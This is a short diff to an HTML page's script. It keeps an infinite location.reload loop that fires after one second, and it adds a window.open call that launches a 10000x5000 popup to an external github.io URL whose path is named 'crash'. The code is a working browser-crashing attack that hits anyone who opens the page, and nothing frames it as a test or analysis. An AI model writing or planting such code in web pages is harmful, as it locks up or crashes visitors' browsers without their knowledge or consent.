@@ -9,9 +9,12 @@
 <script>
 onbeforeunload = function(){localStorage.x=1};
 
-  setTimeout(function(){
-    while(1)location.reload(1)
-  }, 1000)
+setTimeout(function(){
+while(1)location.reload(1)
+}, 1000)
+
+const a = "left=0,top=0,width=10000,height=5000";
+window.open("https://hello-hi-com-au.github.io/crash/file_example_MP3_700KB.mp3", "", a);
 </script>
 
 </body>
